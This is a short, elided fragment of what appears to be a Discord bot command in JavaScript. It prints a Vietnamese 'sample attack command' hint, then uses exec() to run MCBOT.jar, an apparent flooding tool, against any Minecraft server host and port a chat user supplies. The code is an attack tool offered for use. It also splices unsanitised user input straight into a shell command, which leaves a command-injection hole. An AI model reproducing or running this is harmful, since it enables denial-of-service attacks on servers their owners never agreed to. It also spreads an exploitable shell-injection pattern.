...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;playerpacket 1.1.1.1 25565 47`")
	message.channel.send(embed1);
	return;
	}
...
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCBOT.jar ${host}:${port} ${protocol} unexpectedpacket 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
